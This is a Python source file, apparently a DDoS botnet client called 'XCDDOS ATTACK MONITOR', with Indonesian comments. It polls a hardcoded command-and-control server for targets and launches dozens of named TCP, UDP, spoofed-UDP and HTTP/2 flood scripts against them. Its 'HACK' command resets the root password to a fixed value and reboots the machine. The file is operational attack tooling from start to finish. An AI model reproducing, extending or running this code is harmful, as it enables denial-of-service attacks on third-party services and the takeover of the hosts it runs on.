import requests
import json
import time
import subprocess
import threading
import os
import sys
import stat
import shlex
import glob
import signal
from datetime import datetime
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('monitor.log'),
        logging.StreamHandler()
    ]
)

class EndpointMonitor:
    def __init__(self, base_url, username, api_key, check_interval=5):
        """
        Initialize the monitor
        
        Args:
            base_url: Base URL of the server (e.g., http://127.0.0.1:3001)
            username: Username to monitor (e.g., 'john')
            api_key: API key for attacks
            check_interval: How often to check for new items (seconds)
        """
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.api_key = api_key
        self.check_interval = check_interval
        self.endpoint_url = f"{self.base_url}/{self.username}"
        self.removal_url = f"{self.base_url}/{self.username}/done"
        self.processed_items = set()
        self.running = True
        self.active_processes = []
        
        # Ensure all scripts are executable
        self.chmod_all_scripts()
        
        # List semua methods utama dari ssh.js
        self.all_methods = [
            # L4 Methods
            'XCTCP', 'XCUDP', 'XCUDP-SPOOF',
            
            # L7 Methods
            'SSL', 'HDRH1', 'HDRH2', 'HDRH3', 'H1F2', 'H1F3', 'H2F3', 
            'H2AA', 'H2CC', 'H2XC', 'H2LH', 'SBC', 'SBO', 'H2MLT', 
            'H2F', 'TLSTR', 'FLUTRA', 'XCRAPIDV3', 'BROWSERAI', 'XCBYPASS',
            
            # Special Methods
            'STOP', 'HACK'
        ]
        
    def chmod_all_scripts(self):
        """Set chmod 777 for all scripts in current directory"""
        logging.info("=" * 60)
        logging.info("SETTING CHMOD 777 FOR ALL SCRIPTS")
        logging.info("=" * 60)
        
        # Daftar LENGKAP semua script dari ssh.js
        all_scripts = [
            # L4 Scripts
            'tcp.js', 'XCUDP', 'udp-flood', 'udp-spoof.py',
            
            # L7 Scripts - Core
            'SOCKET', 'SOUND.js', 'power.js', 'HDR.js', 'HDRH2.js',
            'H1F2.js', 'H1F3.js', 'H2F3.js', 'https-flood.js',
            'H2CC.js', 'H2XC.js', 'H2LH.js', 'SBC.go', 'SBO.js',
            'STATIC.js', '0%HTTP2.js', 'H2F.js', 'https-browserv1.js',
            'https-browserv2.js', 'FLUTRA.js', 'rapidresetv3',
            
            # Browser & AI
            'xcddos-browser.js', 'XCBYPAS.js', 'XCBYPASS.js',
            
            # Hold Scripts
            'XCHOLD.py', 'XCHOLD1.py', 'XCHOLD2.py', 'XCHOLD3.py',
            'XCHOLD4.py', 'XCHOLD5.py', 'XCHOLD6.py',
            
            # CDN & Bypass
            'CDN.js', 'flooder.js',
            
            # Other
            'ANSIBLE.js', 'HTTP3.go', 'HTTP3',
            
            # Tambahan dari daftar stop processes di ssh.js
            'H1F2.js', 'H1F3.js', 'H2F3.js', 'H2F.js', 'H2CC.js',
            'H2XC.js', 'H2LH.js', 'SBC', 'SBO.js', 'HDRH2.js'
        ]
        
        # Script tambahan berdasarkan pattern
        additional_patterns = [
            '*.js', '*.py', '*.go', '*.sh', '*.txt',
            'XC*', 'H*', 'S*', 'HTTP*', '*.bin', '*.cache'
        ]
        
        success_count = 0
        fail_count = 0
        
        # 1. Chmod script spesifik
        for script in all_scripts:
            try:
                # Coba dengan nama exact
                if os.path.exists(f"./{script}"):
                    os.chmod(f"./{script}", 0o777)
                    logging.info(f"✓ chmod 777: {script}")
                    success_count += 1
                    continue
                
                # Coba dengan pattern
                found = False
                for pattern in [f"{script}*", f"*{script}", script.lower(), script.upper()]:
                    matches = glob.glob(f"./{pattern}")
                    for match in matches:
                        if os.path.isfile(match):
                            os.chmod(match, 0o777)
                            logging.info(f"✓ chmod 777 (pattern): {os.path.basename(match)}")
                            success_count += 1
                            found = True
                            break
                    if found:
                        break
                        
                if not found:
                    logging.debug(f"Script not found: {script}")
                    fail_count += 1
                    
            except Exception as e:
                logging.error(f"✗ Failed to chmod {script}: {e}")
                fail_count += 1
        
        # 2. Chmod by extension
        extensions = ['.js', '.py', '.go', '.sh', '.txt', '.bin']
        for ext in extensions:
            try:
                files = glob.glob(f"./*{ext}")
                for file in files:
                    if os.path.isfile(file):
                        os.chmod(file, 0o777)
                        logging.info(f"✓ chmod 777 (*{ext}): {os.path.basename(file)}")
                        success_count += 1
            except Exception as e:
                logging.error(f"✗ Failed to chmod *{ext} files: {e}")
        
        # 3. Chmod semua file tanpa ekstensi (binaries)
        try:
            for item in os.listdir('.'):
                if os.path.isfile(item) and '.' not in item:
                    os.chmod(item, 0o777)
                    logging.info(f"✓ chmod 777 (binary): {item}")
                    success_count += 1
        except Exception as e:
            logging.error(f"✗ Failed to chmod binaries: {e}")
        
        # 4. Final recursive chmod
        try:
            result = subprocess.run(
                ['chmod', '-R', '777', '.'],
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode == 0:
                logging.info("✓ chmod -R 777 . (recursive)")
                success_count += 1
            else:
                logging.error(f"✗ Recursive chmod failed: {result.stderr}")
                fail_count += 1
        except Exception as e:
            logging.error(f"✗ Failed recursive chmod: {e}")
            fail_count += 1
        
        logging.info("=" * 60)
        logging.info(f"CHMOD COMPLETE: {success_count} successful, {fail_count} failed")
        logging.info("=" * 60)
    
    def sh_quote(self, s):
        """Shell escaping function"""
        if not s:
            return "''"
        s = str(s).replace("'", "'\\''")
        return f"'{s}'"
    
    def fetch_active_items(self):
        """Fetch active items from the endpoint"""
        try:
            response = requests.get(self.endpoint_url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    connections = data.get('connections', [])
                    return connections
                else:
                    logging.error(f"API returned error: {data.get('message', 'Unknown error')}")
                    return []
            else:
                logging.error(f"HTTP {response.status_code}: {response.text}")
                return []
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")
            return []
    
    def extract_item_key(self, item):
        """Create a unique key for each item"""
        if 'format' in item and item['format'] == 'new':
            return f"{item.get('target')}_{item.get('port')}_{item.get('time')}_{item.get('method')}_{item.get('conc')}"
        elif 'format' in item and item['format'] == 'old':
            return f"{item.get('ip')}_{item.get('port')}_{item.get('time')}"
        elif 'format' in item and item['format'] == 'alt':
            return f"{item.get('url')}_{item.get('time')}_{item.get('method')}"
        else:
            return str(hash(json.dumps(item, sort_keys=True)))
    
    def execute_attack(self, item):
        """Execute attack based on method"""
        if item.get('format') != 'new':
            logging.warning(f"Skipping non-new format item: {item}")
            return
            
        target = item.get('target', '')
        port = item.get('port', '80')
        time_param = item.get('time', '60')
        data = item.get('data', 'GET')
        method = item.get('method', 'XCTCP')
        conc = item.get('conc', '1')
        
        # Shell escape target
        target_quoted = self.sh_quote(target)
        
        # Validasi conc
        try:
            conc_int = int(conc)
            if conc_int < 1:
                conc_int = 1
            if conc_int > 10:
                conc_int = 10
        except:
            conc_int = 1
        
        item_key = self.extract_item_key(item)
        
        # LOG HEADER untuk attack
        logging.info("=" * 60)
        logging.info(f"🚀 EXECUTING ATTACK: {method}")
        logging.info(f"🎯 Target: {target}:{port}")
        logging.info(f"⏱️  Time: {time_param}s | 📊 Concurrency: {conc_int}")
        logging.info(f"📦 Data: {data}")
        logging.info("=" * 60)
        
        try:
            # ============================================
            # METHOD: STOP - HENTIKAN SEMUA SERANGAN
            # ============================================
            if method == 'STOP':
                self.stop_all_attacks(item_key)
                # Untuk STOP, kita tidak perlu schedule removal
                return
            
            # ============================================
            # TIME HOLD MODE (XCHOLD1-6)
            # ============================================
            if time_param in ['XCHOLD1', 'XCHOLD2', 'XCHOLD3', 'XCHOLD4', 'XCHOLD5', 'XCHOLD6']:
                script_name = f"{time_param}.py"
                if os.path.exists(f"./{script_name}"):
                    cmd = f"python3 {script_name} {target_quoted} {port} {data} {method} {conc}"
                    self.run_command(cmd, time_param, item_key, is_hold=True)
                else:
                    logging.error(f"HOLD script not found: {script_name}")
                # Untuk HOLD mode, kita schedule removal tapi nanti akan berjalan terus
                threading.Timer(4.0, self.remove_item, args=(target, port, time_param, item_key)).start()
                return
            
            # ============================================
            # L4 METHODS
            # ============================================
            if method == 'XCTCP':
                for i in range(conc_int):
                    cmd = f"ulimit -n 999999 && node tcp.js {target_quoted} {port} {time_param} 2 raw-http.txt"
                    self.run_command(cmd, f"XCTCP-{i}", item_key)
            
            elif method == 'XCUDP':
                for i in range(conc_int):
                    cmd = f"ulimit -n 999999 && ./XCUDP {target_quoted} {port} 1024 {time_param} {time_param}"
                    self.run_command(cmd, f"XCUDP-{i}", item_key)
            
            elif method == 'XCUDP-SPOOF':
                for i in range(conc_int):
                    cmd1 = f"ulimit -n 999999 && ./udp-flood {target_quoted} {port} 88 5 --frag"
                    cmd2 = f"ulimit -n 999999 && python3 udp-spoof.py {target_quoted} {port} 2 65535 604800"
                    self.run_command(cmd1, f"XCUDP-SPOOF1-{i}", item_key)
                    self.run_command(cmd2, f"XCUDP-SPOOF2-{i}", item_key)
            
            # ============================================
            # L7 METHODS
            # ============================================
            elif method == 'SSL':
                for i in range(conc_int):
                    cmd1 = f"./SOCKET -url {target_quoted} -count {int(time_param) * 1000} -method {data}"
                    cmd2 = f"node SOUND.js {target_quoted} 40 {time_param}"
                    cmd3 = f"node power.js {target_quoted} 25 {time_param} {data}"
                    self.run_command(cmd1, f"SSL-SOCKET-{i}", item_key)
                    self.run_command(cmd2, f"SSL-SOUND-{i}", item_key)
                    self.run_command(cmd3, f"SSL-POWER-{i}", item_key)
            
            elif method == 'HDRH1':
                for i in range(conc_int):
                    cmd = f"node HDR.js {target_quoted} {time_param}"
                    self.run_command(cmd, f"HDRH1-{i}", item_key)
            
            elif method == 'HDRH2':
                for i in range(conc_int):
                    cmd = f"node HDRH2.js {target_quoted} {time_param} 140 4 raw-http.txt"
                    self.run_command(cmd, f"HDRH2-{i}", item_key)
            
            elif method == 'HDRH3':
                for i in range(conc_int):
                    if os.path.exists("./HTTP3"):
                        cmd = f"./HTTP3 -method {data} -target {target_quoted} -time {time_param} -threads 10 -full -rate 64 -delay 15 -query 0"
                    elif os.path.exists("./HTTP3.go"):
                        cmd = f"go run HTTP3.go -method {data} -target {target_quoted} -time {time_param} -threads 10 -full -rate 64 -delay 15 -query 0"
                    else:
                        logging.error(f"HTTP3 binary/script not found for method HDRH3")
                        continue
                    self.run_command(cmd, f"HDRH3-{i}", item_key)
            
            elif method == 'H1F2':
                for i in range(conc_int):
                    cmd = f"node H1F2.js {data} {target_quoted} raw-http.txt {time_param} 120 32"
                    self.run_command(cmd, f"H1F2-{i}", item_key)
            
            elif method == 'H1F3':
                for i in range(conc_int):
                    cmd = f"node H1F3.js {data} {target_quoted} raw-http.txt {time_param} 16 4"
                    self.run_command(cmd, f"H1F3-{i}", item_key)
            
            elif method == 'H2F3':
                for i in range(conc_int):
                    cmd = f"node H2F3.js {data} {target_quoted} {time_param} 8 90 raw-http.txt --full --legit --query 2 --randrate"
                    self.run_command(cmd, f"H2F3-{i}", item_key)
            
            elif method == 'H2AA':
                for i in range(conc_int):
                    cmd = f"node https-flood.js {target_quoted} {time_param} 20 raw-http.txt 1024"
                    self.run_command(cmd, f"H2AA-{i}", item_key)
            
            elif method == 'H2CC':
                for i in range(conc_int):
                    cmd = f"node H2CC.js {data} {target_quoted} {time_param} 8 800 raw-http.txt --query 1"
                    self.run_command(cmd, f"H2CC-{i}", item_key)
            
            elif method == 'H2XC':
                for i in range(conc_int):
                    cmd = f"node H2XC.js {data} {target_quoted} {time_param} 8 800 raw-http.txt --randpath 1 --close"
                    self.run_command(cmd, f"H2XC-{i}", item_key)
            
            elif method == 'H2LH':
                for i in range(conc_int):
                    cmd = f"node H2LH.js {data} {target_quoted} {time_param} 2 raw-http.txt --query 1"
                    self.run_command(cmd, f"H2LH-{i}", item_key)
            
            elif method == 'SBC':
                for i in range(conc_int):
                    cmd = f"go run SBC.go {target_quoted} {time_param}"
                    self.run_command(cmd, f"SBC-{i}", item_key)
            
            elif method == 'SBO':
                for i in range(conc_int):
                    cmd = f"node SBO.js {target_quoted} {time_param} 1 1 raw-http.txt"
                    self.run_command(cmd, f"SBO-{i}", item_key)
            
            elif method == 'CDN':
                for i in range(conc_int):
                    cmd = f"node CDN.js POST {target_quoted} {time_param} 8 90 raw-http.txt --legit true --full true --cdn true"
                    self.run_command(cmd, f"CDN-{i}", item_key)
            
            elif method == 'H2MLT':
                for i in range(conc_int):
                    cmd1 = f"node STATIC.js {target_quoted} {time_param} 300 2 raw-http.txt {data}"
                    cmd2 = f"./rapidresetv3 {data} {target_quoted} {time_param} 16 auto raw-http.txt 1000"
                    cmd3 = f"node 0%HTTP2.js {target_quoted} {time_param} 8 8 raw-http.txt {data}"
                    cmd4 = f"node https-flood.js {target_quoted} {time_param} 2 raw-http.txt 300"
                    self.run_command(cmd1, f"H2MLT1-{i}", item_key)
                    self.run_command(cmd2, f"H2MLT2-{i}", item_key)
                    self.run_command(cmd3, f"H2MLT3-{i}", item_key)
                    self.run_command(cmd4, f"H2MLT4-{i}", item_key)
            
            elif method == 'H2F':
                for i in range(conc_int):
                    cmd = f"node H2F.js {target_quoted} {time_param} 40 20 raw-http.txt"
                    self.run_command(cmd, f"H2F-{i}", item_key)
            
            elif method == 'TLSTR':
                for i in range(conc_int):
                    cmd1 = f"node https-browserv1.js {target_quoted} {time_param} 256 10 raw-http.txt"
                    cmd2 = f"node https-browserv2.js {target_quoted} {time_param} 256 10 raw-http.txt"
                    self.run_command(cmd1, f"TLSTR1-{i}", item_key)
                    self.run_command(cmd2, f"TLSTR2-{i}", item_key)
            
            elif method == 'FLUTRA':
                for i in range(conc_int):
                    cmd = f"node FLUTRA.js {target_quoted} {time_param} 40 raw-http.txt 32 --randuser true --query false"
                    self.run_command(cmd, f"FLUTRA-{i}", item_key)
            
            elif method == 'XCRAPIDV3':
                for i in range(conc_int):
                    cmd = f"./rapidresetv3 {data} {target_quoted} {time_param} 16 auto raw-http.txt 1000"
                    self.run_command(cmd, f"XCRAPIDV3-{i}", item_key)
            
            elif method == 'BROWSERAI':
                for i in range(conc_int):
                    cmd = f"node xcddos-browser.js {target_quoted} {time_param} raw-http.txt --captcha {data} --debug true"
                    self.run_command(cmd, f"BROWSERAI-{i}", item_key)
            
            elif method == 'XCBYPASS':
                for i in range(conc_int):
                    cmd = f"node XCBYPAS.js {target_quoted} {time_param}"
                    self.run_command(cmd, f"XCBYPASS-{i}", item_key)
            
            # ============================================
            # SPECIAL METHOD: HACK
            # ============================================
            elif method == 'HACK':
                # Special method - hanya dijalankan sekali
                cmd1 = "node ANSIBLE.js"
                cmd2 = "sudo sh -c 'echo root:123@Xcddos | chpasswd'"
                self.run_command(cmd1, "HACK-ANSIBLE", item_key)
                self.run_command(cmd2, "HACK-PASSWD", item_key)
                # Reboot setelah 3 detik
                time.sleep(3)
                reboot_cmd = "sudo reboot"
                self.run_command(reboot_cmd, "HACK-REBOOT", item_key)
            
            else:
                logging.warning(f"Unknown method: {method}")
                return
            
            # Schedule removal after 4 seconds
            threading.Timer(4.0, self.remove_item, args=(target, port, time_param, item_key)).start()
            
            logging.info(f"✅ Attack executed: {method} on {target}:{port} for {time_param}s (conc={conc_int})")
            
        except Exception as e:
            logging.error(f"❌ Error executing attack {method}: {e}")
            import traceback
            logging.error(traceback.format_exc())
    
    def run_command(self, command, process_name, item_key, is_hold=False):
        """Run a command and track the process"""
        try:
            logging.info(f"▶️  Running: {process_name}")
            
            # Run command dengan shell=True untuk mendukung ulimit dan &&
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True,
                cwd=os.getcwd(),
                preexec_fn=os.setsid if not is_hold else None  # Buat process group untuk HOLD mode
            )
            
            # Store process reference
            self.active_processes.append({
                'process': process,
                'process_name': process_name,
                'item_key': item_key,
                'start_time': datetime.now(),
                'command': command,
                'pid': process.pid,
                'is_hold': is_hold
            })
            
            # Start a thread to read output
            def read_output(proc, name, key, pid):
                try:
                    # Read stdout
                    for line in iter(proc.stdout.readline, ''):
                        if line.strip():
                            logging.info(f"[{name} PID:{pid}] {line.strip()}")
                    # Read stderr
                    for line in iter(proc.stderr.readline, ''):
                        if line.strip():
                            logging.warning(f"[{name} PID:{pid} ERROR] {line.strip()}")
                    proc.wait()
                    logging.info(f"✅ Process completed: {name} (PID:{pid})")
                except Exception as e:
                    logging.error(f"❌ Error reading output from {name}: {e}")
            
            output_thread = threading.Thread(
                target=read_output,
                args=(process, process_name, item_key, process.pid)
            )
            output_thread.daemon = True
            output_thread.start()
            
            return process
            
        except Exception as e:
            logging.error(f"❌ Failed to execute command for {process_name}: {e}")
            return None
    
    def stop_all_attacks(self, item_key):
        """Stop all running attacks - SAMA PERSIS seperti di ssh.js"""
        logging.info("=" * 60)
        logging.info("🛑 STOPPING ALL ATTACKS")
        logging.info("=" * 60)
        
        # Daftar proses yang akan dihentikan (SAMA dengan di ssh.js)
        processes = [
            'https-browserv1.js', 'https-browserv2.js', 'https-flood.js', 
            'STATIC.js', 'FLUTRA.js', '0%HTTP2.js', 
            'XCUDP', 'tcp.js',
            'power.js', 'rapidresetv3', 
            'SOCKET', 'SOUND.js',
            'XCHOLD.py', 'XCHOLD1.py', 'XCHOLD2.py', 'XCHOLD3.py', 
            'XCHOLD4.py', 'XCHOLD5.py', 'XCHOLD6.py', 
            'HTTP3', 'xcddos-browser.js', 'flooder.js', 'XCBYPASS.js', 'XCBYPAS.js', 'H2F.js',
            'H1F2.js', 'H1F3.js', 'H2F3.js', 'CDN.js', 'HDR.js', 'H2CC.js', 'H2XC.js', 'H2LH.js', 
            'SBC', 'SBO.js', 'HDRH2.js', "udp-flood", "udp-spoof.py",
            '.cache'  # Juga dari ssh.js
        ]
        
        total_killed = 0
        
        # 1. Hentikan dengan pgrep + kill -9 (SAMA seperti di ssh.js)
        for process_name in processes:
            try:
                # Gunakan pgrep untuk mencari PID
                pgrep_cmd = f"pgrep -f {process_name}"
                result = subprocess.run(pgrep_cmd, shell=True, capture_output=True, text=True)
                
                if result.returncode == 0:
                    pids = result.stdout.strip().split('\n')
                    for pid in pids:
                        if pid.strip():
                            try:
                                kill_cmd = f"kill -9 {pid.strip()}"
                                subprocess.run(kill_cmd, shell=True, capture_output=True, text=True)
                                logging.info(f"☠️  Killed PID {pid.strip()} ({process_name})")
                                total_killed += 1
                            except Exception as e:
                                logging.error(f"❌ Failed to kill PID {pid}: {e}")
                else:
                    logging.debug(f"No process found for: {process_name}")
                    
            except Exception as e:
                logging.error(f"❌ Error stopping {process_name}: {e}")
        
        # 2. Hentikan semua proses yang dilacak oleh monitor
        for proc_info in self.active_processes[:]:
            try:
                proc = proc_info['process']
                pid = proc_info.get('pid', 'N/A')
                
                if proc.poll() is None:  # Masih berjalan
                    # Coba terminate dulu
                    proc.terminate()
                    time.sleep(0.5)
                    
                    # Jika masih berjalan, kill
                    if proc.poll() is None:
                        if pid != 'N/A':
                            os.kill(pid, signal.SIGKILL)
                        else:
                            proc.kill()
                    
                    logging.info(f"☠️  Terminated monitored process: {proc_info['process_name']} (PID:{pid})")
                    total_killed += 1
            except Exception as e:
                logging.error(f"❌ Error terminating monitored process {proc_info['process_name']}: {e}")
        
        # 3. Clear the list
        self.active_processes = []
        
        # 4. Cleanup commands (SAMA seperti di ssh.js)
        cleanup_commands = """
        sync; echo 3 > /proc/sys/vm/drop_caches;
        swapoff -a && swapon -a;
        screen -wipe
        """
        try:
            result = subprocess.run(
                cleanup_commands,
                shell=True,
                executable="/bin/bash",
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode == 0:
                logging.info("🧹 Cache sistem telah dibersihkan dan swap telah di-restart.")
            else:
                logging.error(f"❌ Cleanup failed: {result.stderr}")
        except Exception as e:
            logging.error(f"❌ Error during cleanup: {e}")
        
        logging.info("=" * 60)
        logging.info(f"✅ ALL ATTACKS STOPPED! Total killed: {total_killed}")
        logging.info("=" * 60)
    
    def remove_item(self, target, port, time_param, item_key):
        """Remove item from the server after execution"""
        try:
            removal_params = {
                'target': target,
                'port': port,
                'time': time_param
            }
            
            response = requests.get(self.removal_url, params=removal_params, timeout=5)
            
            if response.status_code == 200:
                logging.info(f"🗑️  Removed item from server: {item_key}")
            else:
                logging.warning(f"⚠️  Failed to remove item {item_key}: HTTP {response.status_code}")
                
        except Exception as e:
            logging.error(f"❌ Error removing item {item_key}: {e}")
    
    def cleanup_old_processes(self):
        """Clean up completed processes from tracking list"""
        current_time = datetime.now()
        new_active_processes = []
        
        for proc_info in self.active_processes:
            proc = proc_info['process']
            # Cek apakah proses masih berjalan
            if proc.poll() is None:
                # Proses masih berjalan
                new_active_processes.append(proc_info)
            else:
                # Proses sudah selesai
                runtime = (current_time - proc_info['start_time']).total_seconds()
                if runtime < 300:  # Simpan informasi untuk proses yang baru saja selesai (< 5 menit)
                    new_active_processes.append(proc_info)
                else:
                    logging.debug(f"Removed old process from tracking: {proc_info['process_name']}")
        
        self.active_processes = new_active_processes
    
    def monitor_loop(self):
        """Main monitoring loop"""
        logging.info("=" * 60)
        logging.info("🚀 XCDDOS MONITOR STARTED")
        logging.info(f"📡 Monitoring: {self.endpoint_url}")
        logging.info(f"⏱️  Check interval: {self.check_interval} seconds")
        logging.info(f"👤 Username: {self.username}")
        logging.info(f"🔑 API Key: {self.api_key}")
        logging.info("=" * 60)
        
        # Tampilkan metode yang didukung
        logging.info("✅ Supported Methods:")
        logging.info("  L4: XCTCP, XCUDP, XCUDP-SPOOF")
        logging.info("  L7: SSL, HDRH1, HDRH2, HDRH3, CDN, H1F2, H1F3, H2F3")
        logging.info("       H2AA, H2CC, H2XC, H2LH, SBC, SBO, H2MLT")
        logging.info("       H2F, TLSTR, FLUTRA, XCRAPIDV3, BROWSERAI")
        logging.info("       XCBYPASS")
        logging.info("  Special: STOP, HACK")
        logging.info("  Hold: XCHOLD1-6 (as time parameter)")
        logging.info("=" * 60)
        
        while self.running:
            try:
                # Clean up old processes
                self.cleanup_old_processes()
                
                # Fetch current active items
                items = self.fetch_active_items()
                
                if items:
                    logging.info(f"📥 Found {len(items)} active item(s)")
                    
                    for item in items:
                        item_key = self.extract_item_key(item)
                        
                        # Skip if already processed
                        if item_key in self.processed_items:
                            continue
                        
                        # Process based on format
                        if item.get('format') == 'new':
                            logging.info("─" * 40)
                            logging.info(f"🎯 NEW ATTACK REQUEST")
                            logging.info(f"   Target: {item.get('target')}")
                            logging.info(f"   Port: {item.get('port')}")
                            logging.info(f"   Time: {item.get('time')}")
                            logging.info(f"   Data: {item.get('data')}")
                            logging.info(f"   Method: {item.get('method')}")
                            logging.info(f"   Concurrency: {item.get('conc')}")
                            logging.info("─" * 40)
                            
                            # Mark as processed
                            self.processed_items.add(item_key)
                            
                            # Execute the attack
                            self.execute_attack(item)
                        
                        elif item.get('format') == 'old':
                            logging.info(f"📜 Legacy item detected: {item}")
                            self.processed_items.add(item_key)
                        
                        elif item.get('format') == 'alt':
                            logging.info(f"🔄 Alternative item detected: {item}")
                            self.processed_items.add(item_key)
                
                # Wait before next check
                time.sleep(self.check_interval)
                
            except KeyboardInterrupt:
                logging.info("Received keyboard interrupt, shutting down...")
                self.stop_monitor()
                break
            except Exception as e:
                logging.error(f"❌ Error in monitor loop: {e}")
                time.sleep(self.check_interval)
    
    def stop_monitor(self):
        """Stop the monitor and cleanup"""
        self.running = False
        logging.info("🛑 Stopping monitor and cleaning up...")
        
        # Stop all attacks sebelum keluar
        self.stop_all_attacks("SHUTDOWN")
        
        logging.info("✅ Monitor stopped successfully")


def check_required_files():
    """Check for required files and scripts"""
    logging.info("📋 Checking required files...")
    
    # File utama yang diperlukan
    required_files = [
            'https-browserv1.js', 'https-browserv2.js', 'https-flood.js', 
            'STATIC.js', 'FLUTRA.js', '0%HTTP2.js', 
            'XCUDP', 'tcp.js',
            'power.js', 'rapidresetv3', 
            'SOCKET', 'SOUND.js',
            'XCHOLD.py', 'XCHOLD1.py', 'XCHOLD2.py', 'XCHOLD3.py', 
            'XCHOLD4.py', 'XCHOLD5.py', 'XCHOLD6.py', 
            'HTTP3', 'xcddos-browser.js', 'flooder.js', 'XCBYPASS.js', 'XCBYPAS.js', 'H2F.js',
            'H1F2.js', 'H1F3.js', 'H2F3.js', 'CDN.js', 'HDR.js', 'H2CC.js', 'H2XC.js', 'H2LH.js', 
            'SBC', 'SBO.js', 'HDRH2.js', "udp-flood", "udp-spoof.py",
    ]
    
    missing_files = []
    for file in required_files:
        if not os.path.exists(f"./{file}"):
            missing_files.append(file)
    
    if missing_files:
        logging.warning(f"⚠️ Missing required files: {missing_files}")
        logging.warning("⚠️ Some attacks may not work without these files")
    else:
        logging.info("✅ All required files found")
    
    # List semua file di direktori
    all_files = os.listdir('.')
    script_count = len([f for f in all_files if f.endswith(('.js', '.py', '.go', '.sh'))])
    logging.info(f"📁 Files in directory: {len(all_files)} total, {script_count} scripts")


def main():
    """Main function"""
    # Configuration
    # ⚠️ Jangan pernah ubah atau mengganti bagian ini!
    BASE_URL = "http://142.91.108.79:3001"
    USERNAME = "xcddos"
    API_KEY = "XCDDOS"
    CHECK_INTERVAL = 5
    #⚠️ Jangan ubah apapun ampai sini karena ini ip penggerak utama untuk menjalankan base script agar work atau istilahnya ini script dengan encripsi khusus
    
    # Check current directory and files
    current_dir = os.getcwd()
    logging.info(f"📂 Current directory: {current_dir}")
    check_required_files()
    
    # Create monitor instance
    monitor = EndpointMonitor(BASE_URL, USERNAME, API_KEY, CHECK_INTERVAL)
    
    try:
        # Start monitoring
        monitor.monitor_loop()
    except KeyboardInterrupt:
        monitor.stop_monitor()
        logging.info("👋 Monitor stopped by user")
    except Exception as e:
        logging.error(f"💥 Fatal error: {e}")
        monitor.stop_monitor()
        sys.exit(1)


if __name__ == "__main__":
    # Banner
    print("\n" + "=" * 60)
    print("🚀 XCDDOS ATTACK MONITOR v3.0")
    print("=" * 60)
    print("✨ Features:")
    print("  • Complete chmod 777 for all scripts")
    print("  • STOP function identical to ssh.js")
    print("  • Concurrency support (conc parameter)")
    print("  • Hold mode (XCHOLD1-6)")
    print("  • Process management with pgrep/kill")
    print("  • Automatic cleanup")
    print("=" * 60)
    
    main()